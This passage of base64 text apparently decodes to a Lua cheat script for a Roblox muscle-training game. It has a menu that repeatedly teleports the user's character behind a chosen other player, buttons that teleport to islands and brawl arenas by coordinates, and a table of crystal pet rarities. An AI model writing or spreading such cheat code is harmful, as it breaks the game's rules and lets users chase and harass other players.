WVyIH49IExvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgZm9sbG93RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQ0KICAgIGVuZA0KZW5kDQoNClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpDQogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgZm9sbG93RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQ0KICAgIGVuZA0KZW5kKQ0KDQpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQ0KICAgIGZvbGxvd0Ryb3Bkb3duOkNsZWFyKCkNCiAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8NCiAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgICAgIGZvbGxvd0Ryb3Bkb3duOkFkZChwbHIuTmFtZSkNCiAgICAgICAgZW5kDQogICAgZW5kDQogICAgaWYgZm9sbG93VGFyZ2V0ID09IHBsYXllci5OYW1lIHRoZW4NCiAgICAgICAgZm9sbG93VGFyZ2V0ID0gbmlsDQogICAgICAgIGZvbGxvd2luZyA9IGZhbHNlDQogICAgZW5kDQplbmQpDQoNCktpbGxzVGFiOkJ1dHRvbih7DQogICAgVGl0bGUgPSAiVW5mb2xsb3ciLA0KICAgIERlc2MgPSAiU3RvcCBmb2xsb3dpbmcgY3VycmVudCB0YXJnZXQiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBmb2xsb3dpbmcgPSBmYWxzZQ0KICAgICAgICBmb2xsb3dUYXJnZXQgPSBuaWwNCiAgICBlbmQNCn0pDQoNCi0tIEZvbGxvdyBsb29wDQp0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICB3aGlsZSB0cnVlIGRvDQogICAgICAgIHRhc2sud2FpdCgwLjIpDQogICAgICAgIGlmIGZvbGxvd2luZyBhbmQgZm9sbG93VGFyZ2V0IHRoZW4NCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoZm9sbG93VGFyZ2V0KQ0KICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4NCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBmb2xsb3dQbGF5ZXIodGFyZ2V0UGxheWVyKQ0KICAgICAgICAgICAgICAgICAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q2hhciA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXINCg0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgKG15Q2hhciBhbmQgdGFyZ2V0Q2hhcikgdGhlbiByZXR1cm4gZW5kDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15SFJQID0gbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SFJQID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgbXlIUlAgYW5kIHRhcmdldEhSUCB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmb2xsb3dQb3MgPSB0YXJnZXRIUlAuUG9zaXRpb24gLSAodGFyZ2V0SFJQLkNGcmFtZS5Mb29rVmVjdG9yICogMykNCiAgICAgICAgICAgICAgICAgICAgICAgIG15SFJQLkNGcmFtZSA9IENGcmFtZS5uZXcoZm9sbG93UG9zLCB0YXJnZXRIUlAuUG9zaXRpb24pDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvbGxvd1BsYXllcih0YXJnZXQpDQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgZm9sbG93aW5nID0gZmFsc2UNCiAgICAgICAgICAgICAgICBmb2xsb3dUYXJnZXQgPSBuaWwNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCmVuZCkNCg0KLS0gVGVsZXBvcnQgVGFiDQpsb2NhbCBUZWxlcG9ydFRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlRlbGVwb3J0IiwgSWNvbiA9ICJtYXAtcGluIn0pDQoNCi0tIElzbGFuZHMgU2VjdGlvbg0KVGVsZXBvcnRUYWI6U2VjdGlvbih7VGl0bGUgPSAiSXNsYW5kcyJ9KQ0KDQpUZWxlcG9ydFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIlNwYXduIiwNCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIFNwYXduIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQ0KICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygyLCA4LCAxMTUpDQogICAgICAgIA0KICAgICAgICBXaW5kb3c6Tm90aWZ5KHsNCiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwNCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBTcGF3biIsDQogICAgICAgICAgICBUaW1lID0gMw0KICAgICAgICB9KQ0KICAgIGVuZA0KfSkNCg0KVGVsZXBvcnRUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJTZWNyZXQgQXJlYSIsDQogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBTZWNyZXQgQXJlYSIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpDQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkNCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQ0KICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTk0NywgMiwgNjE5MSkNCiAgICAgICAgDQogICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLA0KICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIFNlY3JldCBBcmVhIiwNCiAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgIH0pDQogICAgZW5kDQp9KQ0KDQpUZWxlcG9ydFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIlRpbnkgSXNsYW5kIiwNCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIFRpbnkgSXNsYW5kIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQ0KICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMzQsIDcsIDE5MDMpDQogICAgICAgIA0KICAgICAgICBXaW5kb3c6Tm90aWZ5KHsNCiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwNCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBUaW55IElzbGFuZCIsDQogICAgICAgICAgICBUaW1lID0gMw0KICAgICAgICB9KQ0KICAgIGVuZA0KfSkNCg0KVGVsZXBvcnRUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJGcm96ZW4gSXNsYW5kIiwNCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIEZyb3plbiBJc2xhbmQiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC0yNjAwLjAwMjQ0LCAzLjY3Njg2NTU4LCAtNDAzLjg4NDM2OSwgMC4wODczNjE3MDA4LCAxLjA0ODI4OTllLTA5LCAwLjk5NjE3NjY2LCAzLjA3MjA0MjUzZS0wOCwgMSwgLTMuNzQ2NDAyM2UtMDksIC0wLjk5NjE3NjY2LCAzLjA5MzAyNjI4ZS0wOCwgMC4wODczNjE3MDA4KQ0KICAgICAgICANCiAgICAgICAgV2luZG93Ok5vdGlmeSh7DQogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsDQogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gRnJvemVuIElzbGFuZCIsDQogICAgICAgICAgICBUaW1lID0gMw0KICAgICAgICB9KQ0KICAgIGVuZA0KfSkNCg0KVGVsZXBvcnRUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJNeXRoaWNhbCBJc2xhbmQiLA0KICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gTXl0aGljYWwgSXNsYW5kIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQ0KICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygyMjU1LCA3LCAxMDcxKQ0KICAgICAgICANCiAgICAgICAgV2luZG93Ok5vdGlmeSh7DQogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsDQogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gTXl0aGljYWwgSXNsYW5kIiwNCiAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgIH0pDQogICAgZW5kDQp9KQ0KDQpUZWxlcG9ydFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIkluZmVybm8gSXNsYW5kIiwNCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIEluZmVybm8gSXNsYW5kIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQ0KICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtNjc2OCwgNywgLTEyODcpDQogICAgICAgIA0KICAgICAgICBXaW5kb3c6Tm90aWZ5KHsNCiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwNCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBJbmZlcm5vIElzbGFuZCIsDQogICAgICAgICAgICBUaW1lID0gMw0KICAgICAgICB9KQ0KICAgIGVuZA0KfSkNCg0KVGVsZXBvcnRUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJMZWdlbmQgSXNsYW5kIiwNCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIExlZ2VuZCBJc2xhbmQiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDQ2MDQsIDk5MSwgLTM4ODcpDQogICAgICAgIA0KICAgICAgICBXaW5kb3c6Tm90aWZ5KHsNCiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwNCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBMZWdlbmQgSXNsYW5kIiwNCiAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgIH0pDQogICAgZW5kDQp9KQ0KDQpUZWxlcG9ydFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIk11c2NsZSBLaW5nIElzbGFuZCIsDQogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBNdXNjbGUgS2luZyBJc2xhbmQiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC04NjQ2LCAxNywgLTU3MzgpDQogICAgICAgIA0KICAgICAgICBXaW5kb3c6Tm90aWZ5KHsNCiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwNCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBNdXNjbGUgS2luZyBJc2xhbmQiLA0KICAgICAgICAgICAgVGltZSA9IDMNCiAgICAgICAgfSkNCiAgICBlbmQNCn0pDQoNClRlbGVwb3J0VGFiOkJ1dHRvbih7DQogICAgVGl0bGUgPSAiSnVuZ2xlIElzbGFuZCIsDQogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBKdW5nbGUgSXNsYW5kIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQ0KICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpDQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtODY1OSwgNiwgMjM4NCkNCiAgICAgICAgDQogICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLA0KICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEp1bmdsZSBJc2xhbmQiLA0KICAgICAgICAgICAgVGltZSA9IDMNCiAgICAgICAgfSkNCiAgICBlbmQNCn0pDQoNCi0tIEJyYXdsIEFyZW5hcyBTZWN0aW9uDQpUZWxlcG9ydFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJCcmF3bCBBcmVuYXMifSkNCg0KVGVsZXBvcnRUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJCcmF3bCBMYXZhIiwNCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIExhdmEgQnJhd2wgQXJlbmEiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDQ0NzEsIDExOSwgLTg4MzYpDQogICAgICAgIA0KICAgICAgICBXaW5kb3c6Tm90aWZ5KHsNCiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwNCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBCcmF3bCBMYXZhIiwNCiAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgIH0pDQogICAgZW5kDQp9KQ0KDQpUZWxlcG9ydFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIkJyYXdsIERlc2VydCIsDQogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBEZXNlcnQgQnJhd2wgQXJlbmEiLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpDQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikNCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk2MCwgMTcsIC03Mzk4KQ0KICAgICAgICANCiAgICAgICAgV2luZG93Ok5vdGlmeSh7DQogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsDQogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gQnJhd2wgRGVzZXJ0IiwNCiAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgIH0pDQogICAgZW5kDQp9KQ0KDQpUZWxlcG9ydFRhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIkJyYXdsIFJlZ3VsYXIiLA0KICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gUmVndWxhciBCcmF3bCBBcmVuYSIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpDQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkNCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQ0KICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTE4NDksIDIwLCAtNjMzNSkNCiAgICAgICAgDQogICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLA0KICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEJyYXdsIFJlZ3VsYXIiLA0KICAgICAgICAgICAgVGltZSA9IDMNCiAgICAgICAgfSkNCiAgICBlbmQNCn0pDQoNCi0tIFBldCBTaG9wIFRhYg0KbG9jYWwgUGV0U2hvcFRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlBldCBTaG9wIiwgSWNvbiA9ICJzaG9wcGluZy1iYWcifSkNCg0KbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikNCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQ0KbG9jYWwgcGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcg0KDQotLSBDcnlzdGFsIGRhdGEgc3RydWN0dXJlDQpsb2NhbCBjcnlzdGFsRGF0YSA9IHsNCiAgICBbIkJsdWUgQ3J5c3RhbCJdID0gew0KICAgICAgICB7bmFtZSA9ICJCbHVlIEJpcmRpZSIsIHJhcml0eSA9ICJCYXNpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJPcmFuZ2UgSGVkZ2Vob2ciLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiQmx1ZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sDQogICAgICAgIHtuYW1lID0gIlJlZCBLaXR0eSIsIHJhcml0eSA9ICJCYXNpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJEYXJrIFZhbXB5IiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sDQogICAgICAgIHtuYW1lID0gIkJsdWUgQnVubnkiLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiQmx1ZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sDQogICAgICAgIHtuYW1lID0gIkdyZWVuIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiUHVycGxlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiWWVsbG93IEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifQ0KICAgIH0sDQogICAgWyJHcmVlbiBDcnlzdGFsIl0gPSB7DQogICAgICAgIHtuYW1lID0gIlNpbHZlciBEb2ciLCByYXJpdHkgPSAiQmFzaWMifSwNCiAgICAgICAge25hbWUgPSAiR3JlZW4gQXVyYSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LA0KICAgICAgICB7bmFtZSA9ICJEYXJrIEdvbGVtIiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sDQogICAgICAgIHtuYW1lID0gIkdyZWVuIEJ1dHRlcmZseSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LA0KICAgICAgICB7bmFtZSA9ICJDcmltc29uIEZhbGNvbiIsIHJhcml0eSA9ICJSYXJlIn0sDQogICAgICAgIHtuYW1lID0gIlJlZCBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sDQogICAgICAgIHtuYW1lID0gIkJsdWUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJHcmVlbiBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sDQogICAgICAgIHtuYW1lID0gIlB1cnBsZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sDQogICAgICAgIHtuYW1lID0gIlJlZCBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sDQogICAgICAgIHtuYW1lID0gIlllbGxvdyBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0NCiAgICB9LA0KICAgIFsiRnJvc3QgQ3J5c3RhbCJdID0gew0KICAgICAgICB7bmFtZSA9ICJZZWxsb3cgQnV0dGVyZmx5IiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sDQogICAgICAgIHtuYW1lID0gIlB1cnBsZSBEcmFnb24iLCByYXJpdHkgPSAiUmFyZSJ9LA0KICAgICAgICB7bmFtZSA9ICJCbHVlIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJPcmFuZ2UgUGVnYXN1cyIsIHJhcml0eSA9ICJSYXJlIn0sDQogICAgICAgIHtuYW1lID0gIkxpZ2h0bmluZyIsIHJhcml0eSA9ICJSYXJlIn0sDQogICAgICAgIHtuYW1lID0gIkVsZWN0cm8iLCByYXJpdHkgPSAiQWR2YW5jZWQifQ0KICAgIH0sDQogICAgWyJNeXRoaWNhbCBDcnlzdGFsIl0gPSB7DQogICAgICAgIHtuYW1lID0gIlB1cnBsZSBGYWxjb24iLCByYXJpdHkgPSAiUmFyZSJ9LA0KICAgICAgICB7bmFtZSA9ICJSZWQgRHJhZ29uIiwgcmFyaXR5ID0gIlJhcmUifSwNCiAgICAgICAge25hbWUgPSAiQmx1ZSBGaXJlY2FzdGVyIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiR29sZGVuIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJQb3dlciBMaWdodG5pbmciLCByYXJpdHkgPSAiUmFyZSJ9LA0KICAgICAgICB7bmFtZSA9ICJEYXJrIExpZ2h0bmluZyIsIHJhcml0eSA9ICJFcGljIn0NCiAgICB9LA0KICAgIFsiSW5mZXJubyBDcnlzdGFsIl0gPSB7DQogICAgICAgIHtuYW1lID0gIlJlZCBGaXJlY2FzdGVyIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiSW5mZXJuYWwgRHJhZ29uIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LA0KICAgICAgICB7bmFtZSA9ICJXaGl0ZSBQZWdhc3VzIiwgcmFyaXR5ID0gIlJhcmUifSwNCiAgICAgICAge25hbWUgPSAiR29sZGVuIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJJbmZlcm5vIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiRGFyayBTdG9ybSIsIHJhcml0eSA9ICJVbmlxdWUifQ0KICAgIH0sDQogICAgWyJMZWdlbmRzIENyeXN0YWwiXSA9IHsNCiAgICAgICAge25hbWUgPSAiVWx0cmEgQmlyZGllIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LA0KICAgICAgICB7bmFtZSA9ICJNYWdpYyBCdXR0ZXJmbHkiLCByYXJpdHkgPSAiVW5pcXVlIn0sDQogICAgICAgIHtuYW1lID0gIkdyZWVuIEZpcmVjYXN0ZXIiLCByYXJpdHkgPSAiRXBpYyJ9LA0KICAgICAgICB7bmFtZSA9ICJXaGl0ZSBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiU3VwZXJub3ZhIiwgcmFyaXR5ID0gIkVwaWMifSwNCiAgICAgICAge25hbWUgPSAiUHVycGxlIE5vdmEiLCByYXJpdHkgPSAiVW5pcXVlIn0NCiAgICB9LA0KICAgIFsiTXVzY2xlIEVsaXRlIENyeXN0YWwiXSA9IHsNCiAgICAgICAge25hbWUgPSAiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiIsIHJhcml0eSA9ICJSYXJlIn0sDQogICAgICAgIHtuYW1lID0gIlBoYW50b20gR2VuZXNpcyBEcmFnb24iLCByYXJpdHkgPSAiUmFyZSJ9LA0KICAgICAgICB7bmFtZSA9ICJEYXJrIExlZ2VuZHMgTWFudGljb3JlIiwgcmFyaXR5ID0gIkVwaWMi